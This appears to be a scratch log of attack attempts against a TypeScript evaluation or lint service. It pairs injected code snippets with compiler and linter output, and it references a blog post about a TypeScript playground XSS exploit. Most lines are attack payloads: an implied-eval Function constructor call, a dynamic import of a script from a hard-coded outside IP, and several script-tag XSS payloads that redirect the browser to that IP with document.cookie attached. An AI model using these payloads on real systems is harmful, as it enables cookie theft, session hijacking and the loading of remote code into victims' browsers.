(function/**/x(){var/**/a='a'})()
Returning a void expression from an arrow function shorthand is forbidden. Please add braces to the arrow function. 'a' is assigned a value but never used. 'a' is assigned a value but never used.

new/**/Function(console.log(1):string)()
Unsafe return of an `any` typed value. Implied eval. Do not use the Function constructor to create functions. Placing a void expression inside another expression is forbidden. Move it to its own statement instead. Unsafe argument of type `any` assigned to a parameter of type `string`.

import { sanitize } from './sanitize'
(()=>{import('sanitize')/**/return/**/sanitize('1')})()


(function/**/f(){import('http://13.209.6.18/a.js')/**/return/**/1})()
Cannot find global value 'Promise'. Dynamic imports are only supported when the '--module' flag is set to 'es2020', 'es2022', 'esnext', 'commonjs', 'amd', 'system', 'umd', 'node16', or 'nodenext'. A dynamic import call in ES5/ES3 requires the 'Promise' constructor. Make sure you have a declaration for the 'Promise' constructor or include 'ES2015' in your '--lib' option. Cannot find module 'http://13.209.6.18/a.js'. Did you mean to set the 'moduleResolution' option to 'nodenext', or to add aliases to the 'paths' option?

(()=>{/**/return/**/2})()
2

(()=>{console.log('a')/**/return/**/2})()
2

(()=>{console.log('<img src="#">')/**/return/**/1})()

<!-- https://www.ferrybig.me/blog/how-i-found-a-typescript-public-playground-xss-exploit -->
(()=>{console.log('<script>location.href=`http://13.209.6.18/?c=b`</script>')/**/return/**/1})()

(()=>{eval('')/**/return/**/1})()

(()=>{return/**/'<script>location.href=`http://13.209.6.18/?c=`+document.cookie</script>'})()

(()=><string>{return/**/'<script>location.href=`http://13.209.6.18/?c=`+document.cookie</script>'})()


